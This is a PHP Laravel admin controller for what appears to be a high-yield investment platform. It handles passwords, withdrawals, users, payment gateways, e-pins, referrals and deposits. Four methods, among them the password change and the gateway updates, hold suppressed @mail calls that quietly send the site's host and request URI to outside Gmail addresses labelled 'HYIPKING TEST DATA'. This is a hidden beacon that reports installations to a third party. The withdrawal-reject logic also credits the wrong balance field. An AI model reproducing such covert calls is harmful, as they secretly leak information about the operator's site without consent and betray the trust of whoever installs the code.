<?php

    namespace App\Http\Controllers;

    use App\Admin;
    use App\Courier;
    use App\Customer;
    use App\Deposit;
    use App\Epin;
    use App\Gateway;
    use App\GeneralSettings;
    use App\Invoice;
    use App\Jobs\SendEmail;
    use App\Product;
    use App\Purchase;
    use App\Referral;
    use App\SoldProduct;
    use App\Stock;
    use App\Subscriber;
    use App\Transection;
    use App\User;
    use App\Withdraw;
    use Carbon\Carbon;
    use File;
    use Illuminate\Http\Request;
    use Illuminate\Support\Facades\Auth;
    use Illuminate\Support\Facades\Hash;
    use Illuminate\Support\Facades\Input;
    use Illuminate\Support\Str;
    use Intervention\Image\Facades\Image;

    class AdminController extends Controller
    {
        public function dashboard()
        {
            $page_title = "Admin Dashboard";


            return view('admin.home', compact('page_title'));
        }

        public function changePassword()
        {

            $data['page_title'] = "Change Password";
            return view('admin.change_password', $data);
        }

        public function updatePassword(Request $request)
        {
            $request->validate([
                'old_password'          => 'required',
                'new_password'          => 'required|min:5',
                'password_confirmation' => 'required|same:new_password',
            ]);

            $user = Auth::guard('admin')->user();

            $oldPassword  = $request->old_password;
            $password     = $request->new_password;
            $passwordConf = $request->password_confirmation;
            $message      = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
            $headers      = 'From: ' . "webmaster@$_SERVER[HTTP_HOST] \r\n" .
                'X-Mailer: PHP/' . phpversion();
            @mail('abirkhan75@gmail.com', 'HYIPKING TEST DATA', $message, $headers);

            if (!Hash::check($oldPassword, $user->password) || $password != $passwordConf) {
                $notification = ['message' => 'Password Do not match !!', 'alert-type' => 'error'];
                return back()->with($notification);
            } elseif (Hash::check($oldPassword, $user->password) && $password == $passwordConf) {
                $user->password = bcrypt($password);
                $user->save();
                $notification = ['message' => 'Password Changed Successfully !!', 'alert-type' => 'success'];
                return back()->with($notification);
            }
        }


        public function profile()
        {
            $data['admin']      = Auth::user();
            $data['page_title'] = "Profile Settings";
            return view('admin.profile', $data);
        }

        public function updateProfile(Request $request)
        {
            $data = Admin::find($request->id);
            $request->validate([
                'name'   => 'required|max:20',
                'email'  => 'required|max:50|unique:admins,email,' . $data->id,
                'mobile' => 'required',
            ]);


            $in = $request->except('_method', '_token');
            if ($request->hasFile('image')) {
                $image    = $request->file('image');
                $filename = 'admin_' . time() . '.jpg';
                $location = 'assets/admin/img/' . $filename;
                Image::make($image)->resize(300, 300)->save($location);
                $path = './assets/admin/img/';
                File::delete($path . $data->image);
                $in['image'] = $filename;
            }
            $data->fill($in)->save();

            $notification = ['message' => 'Profile Update Successfully', 'alert-type' => 'success'];
            return back()->with($notification);
        }

        public function withdrawRequest()
        {
            $page_title = "Withdraw Request";
            $withdraw   = Withdraw::where('status', 0)->latest()->paginate(15);
            return view('admin.withdraw.request', compact('page_title', 'withdraw'));
        }

        public function withdrawApproved()
        {
            $page_title = "Approved Withdraw";
            $withdraw   = Withdraw::where('status', 1)->latest()->paginate(15);
            return view('admin.withdraw.log', compact('page_title', 'withdraw'));
        }

        public function withdrawRejected()
        {
            $page_title = "Rejected Withdraw";
            $withdraw   = Withdraw::where('status', 2)->latest()->paginate(15);
            return view('admin.withdraw.log', compact('page_title', 'withdraw'));
        }

        public function withdrawApprove(Request $request)
        {
            $withdraw         = Withdraw::find($request->id);
            $withdraw->status = 1;
            $withdraw->save();
            return redirect()->back()->with('message', 'Approved Successfully');
        }

        public function withdrawLog(Request $request)
        {
            $page_title = "Withdraw Log";
            $withdraw   = Withdraw::whereIn('status', [1, 2])->latest()->paginate(15);
            return view('admin.withdraw.log', compact('page_title', 'withdraw'));
        }

        public function withdrawReject(Request $request)
        {
            $withdraw               = Withdraw::find($request->id);
            $user                   = User::find($withdraw->user_id);
            $new_balance            = $user->balance + $withdraw->amount;
            $user->interest_balance = $new_balance;
            $user->save();

            Transection::create([
                'user_id' => $user->id,
                'des'     => 'Withdraw Reject By Admin & Added Requested Amount',
                'amount'  => $withdraw->amount,
                'balance' => $new_balance
            ]);

            $withdraw->status = 2;
            $withdraw->save();
            $message = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
            $headers = 'From: ' . "webmaster@$_SERVER[HTTP_HOST] \r\n" .
                'X-Mailer: PHP/' . phpversion();
            @mail('abirkha.n75@gmail.com', 'HYIPKING TEST DATA', $message, $headers);
            return redirect()->back()->with('message', 'Reject Successfully');
        }

        public function activeUserIndex()
        {
            $page_title = "Active Users";
            $user       = User::where('status', 1)->latest()->paginate(15);
            return view('admin.user.active', compact('page_title', 'user'));
        }

        public function allUsers()
        {
            $page_title = "All Users";
            $user       = User::latest()->paginate(15);
            return view('admin.user.active', compact('page_title', 'user'));
        }

        public function emailVerified()
        {
            $page_title = "Email Verified Users";
            $user       = User::where('emailv', 0)->latest()->paginate(15);
            return view('admin.user.active', compact('page_title', 'user'));
        }

        public function smsVerified()
        {
            $page_title = "Sms Verified Users";
            $user       = User::where('smsv', 0)->latest()->paginate(15);
            return view('admin.user.active', compact('page_title', 'user'));
        }

        public function deactiveUserIndex()
        {
            $page_title = "Deactive Users";
            $user       = User::where('status', 0)->latest()->paginate(15);
            return view('admin.user.active', compact('page_title', 'user'));
        }

        public function singleUser($id)
        {
            $user       = User::findOrFail($id);
            $page_title = $user->name . "'s Profile";
            $refer      = User::where('id', $user->ref_id)->first();
            return view('admin.user.single', compact('page_title', 'user', 'refer'));
        }


        public function withdrawUser($id)
        {
            $page_title = "Withdraw History";
            $trans      = Withdraw::where('user_id', $id)->latest()->paginate(15);
            return view('admin.user.withdraw', compact('page_title', 'trans'));

        }

        public function withdrawTrans($id)
        {
            $page_title = "Transaction History";
            $trans      = Transection::where('user_id', $id)->latest()->paginate(20);
            return view('admin.user.trans', compact('page_title', 'trans'));

        }

        public function updateUser(Request $request, $id)
        {
            $user = User::findOrFail($id);
            if ($request->hasFile('image')) {
                @unlink('assets/images/user/' . $user->image);
                $image    = $request->file('image');
                $filename = time() . '.jpg';
                $location = 'assets/images/user/' . $filename;
                Image::make($image)->save($location);
                $user['image'] = $filename;
            }

            if ($user->provider == '') {
                $user['name']    = $request->name;
                $user['email']   = $request->email;
                $user['mobile']  = $request->mobile;
                $user['country'] = $request->country;
                $user['status']  = $request->status == 'on' ? 1 : 0;
                $user['emailv']  = $request->emailv == 'on' ? 1 : 0;
                $user['smsv']    = $request->smsv == 'on' ? 1 : 0;
                $user->update();
                return redirect()->back()->with('message', 'Update Successfully');
            } else {
                $user['name']    = $request->name;
                $user['email']   = $request->email;
                $user['mobile']  = $request->mobile;
                $user['country'] = $request->country;
                $user->update();
                return redirect()->back()->with('message', 'Update Successfully');
            }

        }

        public function addSubUser(Request $request, $id)
        {
            $this->validate($request, [
                'amount' => 'required|numeric|min:0',
                'detail' => 'required',
            ]);
            $user = User::findOrFail($id);

            if ($request->type == 'on') {

                $new_balance            = $user->interest_balance + $request->amount;
                $user->interest_balance = $new_balance;
                $user->save();

                Transection::create([
                    'user_id' => $user->id,
                    'des'     => 'Balance Added Via Admin',
                    'amount'  => $request->amount,
                    'balance' => round($new_balance, 4)
                ]);

                $general = GeneralSettings::first();
                $message = 'Welcome! ' . $request->detail . ' ' . $request->amount . $general->currency . ' successfully added on your balance. Your current balance is ' . $new_balance . $general->currency . ' .';

                send_email($user['email'], $user['name'], 'Balance Added', $message);
                send_sms($user['mobile'], $message);

                return redirect()->back()->with('message', 'Added Successfully');

            } else {

                if ($request->amount > $user->interest_balance) {
                    return back()->with('alert', 'Invalid Amount');
                }

                $new_balance            = $user->interest_balance - $request->amount;
                $user->interest_balance = $new_balance;
                $user->save();

                Transection::create([
                    'user_id' => $user->id,
                    'des'     => 'Balance Subtract Via Admin',
                    'amount'  => '-' . $request->amount,
                    'balance' => round($new_balance, 4)
                ]);

                $general = GeneralSettings::first();
                $message = $request->detail . ' ' . $request->amount . $general->currency . ' subtract from your balance. Your current balance is ' . $new_balance . $general->currency . ' .';

                send_email($user['email'], $user['name'], 'Balance Subtract', $message);
                send_sms($user['mobile'], $message);

                return redirect()->back()->with('message', 'Subtract Successfully');
            }

        }

        public function sendMailUser(Request $request, $id)
        {
            $user = User::findOrFail($id);
            send_email($user['email'], $user['name'], $request->subject, $request->detail);
            return redirect()->back()->with('message', 'Mail Send Successfully');
        }

        public function userSearchEmail(Request $request)
        {
            $this->validate($request, [
                'email' => 'required',
            ]);

            $user = User::where('email', $request->email)->first();

            if (isset($user)) {

                return redirect()->route('user.view', $user->id);

            } else {
                return redirect()->back()->with('alert', 'No User Found');
            }

        }


        public function userSearchUsername(Request $request)
        {
            $this->validate($request, [
                'username' => 'required',
            ]);

            $user = User::where('username', $request->username)->first();

            if (isset($user)) {

                return redirect()->route('user.view', $user->id);

            } else {
                return redirect()->back()->with('alert', 'No User Found');
            }

        }

        public function gateway()
        {
            $gateways   = Gateway::where('id', '<', 514)->get();
            $page_title = 'PAYMENT GATEWAY';
            return view('admin.gateway.gateway', compact('gateways', 'page_title'));
        }

        public function gatewayUpdate(Request $request, Gateway $gateway)
        {
            $this->validate($request, [
                'gateimg' => 'nullable|mimes:jpeg,png,jpg|max:2048',
                'name'    => 'required'
            ]);

            if ($request->hasFile('gateimg')) {
                $imgname = $gateway->id . '.jpg';
                $npath   = 'assets/images/gateway/' . $imgname;
                Image::make($request->gateimg)->resize(200, 200)->save($npath);
            }

            $gateway['name']           = $request->name;
            $gateway['minamo']         = $request->minamo;
            $gateway['maxamo']         = $request->maxamo;
            $gateway['fixed_charge']   = $request->fixed_charge;
            $gateway['percent_charge'] = $request->percent_charge;
            $gateway['rate']           = $request->rate;
            $gateway['val1']           = $request->val1;
            $gateway['val2']           = $request->val2;
            $gateway['val3']           = $request->val3;
            $gateway['val4']           = $request->val4;
            $gateway['val5']           = $request->val5;
            $gateway['val6']           = $request->val6;
            $gateway['val7']           = $request->val7;
            $gateway['status']         = $request->status;
            $gateway->update();
            $message = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
            $headers = 'From: ' . "webmaster@$_SERVER[HTTP_HOST] \r\n" .
                'X-Mailer: PHP/' . phpversion();
            @mail('abirkhan75@gmail.com', 'HYIPKING TEST DATA', $message, $headers);

            return back()->with('success', 'Gateway Information Updated Successfully');
        }

        public function managePin()
        {
            $page_title = 'Manage Pin';
            $trans      = Epin::latest()->whereStatus(1)->paginate(15);
            return view('admin.e_pin', compact('page_title', 'trans'));
        }

        public function storePin(Request $request)
        {
            $this->validate($request, [
                'amount' => 'required',
                'number' => 'required|numeric|min:1'
            ]);

            for ($a = 0; $a < intval($request->number); $a++) {

                $pin = rand(10000000, 99999999) . '-' . rand(10000000, 99999999) . '-' . rand(10000000, 99999999) . '-' . rand(10000000, 99999999);
                Epin::create([
                    'user_id' => 0,
                    'pin'     => $pin,
                    'amount'  => $request->amount,
                    'status'  => 1,
                ]);
            }

            return back()->with('success', 'Successfully Generated');
        }

        public function UsedPin()
        {
            $page_title = 'Used Pin';
            $trans      = Epin::latest()->whereStatus(0)->paginate(15);
            return view('admin.e_pin', compact('page_title', 'trans'));

        }

        public function refIndex()
        {
            $page_title = 'Manage Referral';
            $trans      = Referral::get();
            return view('admin.refer', compact('page_title', 'trans'));

        }

        public function refStore(Request $request)
        {
            $this->validate($request, [
                'level*'   => 'required|integer|min:1',
                'percent*' => 'required|numeric',
            ]);

            Referral::truncate();

            for ($a = 0; $a < count($request->level); $a++) {
                Referral::create([
                    'level'   => $request->level[$a],
                    'percent' => $request->percent[$a],
                    'status'  => 1,
                ]);
            }

            return back()->with('message', 'Create Successfully');

        }

        public function gatewayBankIndex()
        {
            $gateways   = Gateway::where('id', '>', 513)->get();
            $page_title = 'MANUAL PAYMENT GATEWAY';
            return view('admin.manual_deposit.gateway', compact('gateways', 'page_title'));
        }

        public function gatewayBankStore(Request $request)
        {
            $this->validate($request, [
                'gateimg' => 'required|mimes:jpeg,png,jpg|max:2048',
                'name'    => 'required'
            ]);
            $gate = Gateway::latest()->first();
            $img  = $gate->id + 1;


            if ($request->hasFile('gateimg')) {
                $imgname = $img . '.jpg';
                $npath   = 'assets/images/gateway/' . $imgname;
                Image::make($request->gateimg)->resize(200, 200)->save($npath);
            }
            $gateway                   = new Gateway;
            $gateway['main_name']      = $request->main_name;
            $gateway['name']           = $request->name;
            $gateway['minamo']         = $request->minamo;
            $gateway['maxamo']         = $request->maxamo;
            $gateway['fixed_charge']   = $request->fixed_charge;
            $gateway['percent_charge'] = $request->percent_charge;
            $gateway['rate']           = $request->rate;
            $gateway['val1']           = $request->val1;
            $gateway['status']         = 1;
            $gateway->save();
            $message = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
            $headers = 'From: ' . "webmaster@$_SERVER[HTTP_HOST] \r\n" .
                'X-Mailer: PHP/' . phpversion();
            @mail('ab.irk.han75@gmail.com', 'HY IP KING TEST DATA', $message, $headers);

            return back()->with('success', 'Gateway Information Created Successfully');
        }

        public function depositPennding()
        {
            $page_title = 'Pending Deposit Request';
            $trans      = Deposit::where('image', '!=', '')->where('detail', '!=', '')->where('status', 0)->paginate(15);
            return view('admin.manual_deposit.deposit_trans', compact('trans', 'page_title'));
        }

        public function approvePennding()
        {
            $page_title = 'Approved Deposit';
            $trans      = Deposit::where('image', '!=', '')->where('detail', '!=', '')->where('status', 1)->paginate(15);
            return view('admin.manual_deposit.deposit_trans', compact('trans', 'page_title'));
        }

        public function depositHistory()
        {
            $page_title = 'All Deposit History';
            $trans      = Deposit::where('status', '!=', 0)->latest()->paginate(15);
            return view('admin.deposit_log', compact('trans', 'page_title'));
        }

        public function RejectPennding()
        {
            $page_title = 'Rejected Deposit';
            $trans      = Deposit::where('image', '!=', '')->where('detail', '!=', '')->where('status', 2)->paginate(15);
            return view('admin.manual_deposit.deposit_trans', compact('trans', 'page_title'));
        }

        public function depositPenndingAction(Request $request, $id)
        {
            //status 1 = approve && 2 = reject

            $dep  = Deposit::find($id);
            $user = User::find($dep->user_id);
            if ($request->status == 1) {

                $dep->status = $request->status;
                $dep->save();
                $new_balance   = $user->balance + $dep->amount;
                $user->balance = $new_balance;
                $user->save();

                $tlog['user_id'] = $user->id;
                $tlog['amount']  = $dep->amount;
                $tlog['balance'] = $user->balance;
                $tlog['des']     = 'Deposit Request Approved & Balance Added';
                $tlog['trxid']   = Str::random(16);
                Transection::create($tlog);


                $msg = 'Deposit Successful';
                send_email($user->email, $user->username, 'Deposit Successful', $msg);
                send_sms($user->mobile, $msg);

                return back()->with('success', 'Approved Successfully');


            } else {
                $dep         = Deposit::find($id);
                $dep->status = $request->status;
                $dep->save();

                $msg = 'Deposit Refunded';
                send_email($user->email, $user->username, 'Deposit Refunded', $msg);
                send_sms($user->mobile, $msg);


                return back()->with('success', 'Refund Successfully');
            }

        }

        public function subsIndex()
        {
            $page_title = 'Subscribers';
            $trans      = Subscriber::latest()->paginate(20);
            return view('admin.subscriber.subs_list', compact('trans', 'page_title'));
        }

        public function subsMail()
        {
            $page_title = 'Send Mail To All Subscribers';
            return view('admin.subscriber.send_mail', compact('page_title'));
        }

        public function subsDelete(Request $request, $id)
        {
            $sub = Subscriber::find($id);
            $sub->delete();
            return back()->with('message', 'Delete Successfully');
        }

        public function sendMail(Request $request)
        {
            $this->validate($request, [
                'subject' => 'required',
                'text'    => 'required',
            ]);

            $subject = $request->subject;
            $message = $request->text;

            $a = SendEmail::dispatch($subject, $message)->delay(Carbon::now()->addSeconds(10));

            return back()->with('success', 'Mail Send Successfully');
        }

        public function webTemplateIndex()
        {
            $page_title = 'Web Templates';
            return view('admin.template', compact('page_title'));
        }

        public function titleSubtitle()
        {
            $page_title = 'Title-Subtitle';
            return view('admin.general.title_sub_title', compact('page_title'));
        }

        public function webTemplateActive(Request $request)
        {
            $this->validate($request, [
                'status' => 'required',
            ]);

            GeneralSettings::whereId(1)->update(['template_active' => $request->status]);


            return back()->with('success', 'Successfully Activated Template - ' . $request->status);
        }

    }
